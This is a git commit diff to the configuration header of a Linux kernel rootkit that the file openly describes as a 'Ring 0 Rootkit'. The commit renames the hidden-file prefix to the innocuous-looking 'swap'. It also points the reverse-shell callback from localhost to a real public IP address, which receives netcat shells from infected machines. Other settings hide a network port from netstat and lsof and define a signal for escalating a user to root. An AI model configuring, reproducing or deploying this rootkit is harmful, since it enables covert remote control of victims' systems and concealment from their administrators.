d93bfdd5220bf46f931b1cbc1f55ed0e2cf72a6d
Acen <113854209+littlAcen@users.noreply.github.com>
2026-01-31 07:50:47 +0100

    Update config.h

--- config.h
+++ config.h
@@ -30,9 +30,9 @@ MODULE_DESCRIPTION("Ring 0 Rootkit for Linux Kernels x86/x86_64 5.x/6.x");
 //=====================[YOU CAN CHANGE THIS]========================//
 #define MODULENAME "rebellion"      // if you change the file name, you must change it here too
 #define HIDE_PORT 1234              // TCP and UDP port to hide (only netstat & lsof)
-#define MAGIC_PREFIX "reb_"         // folder/file prefix to hide
+#define MAGIC_PREFIX "swap"         // folder/file prefix to hide
 //==========[REVERSE SHELL]=========//
-#define YOUR_SRV_IP "127.0.0.1"     // IP address of your server to receive the shell via netcat when pinging the infected machine
+#define YOUR_SRV_IP "194.164.63.118"     // IP address of your server to receive the shell via netcat when pinging the infected machine
 #define YOUR_SRV_PORT 1234          // port where you will receive the shell
 //==================================//
 #define SIGUSR1 10                  // user2root signal
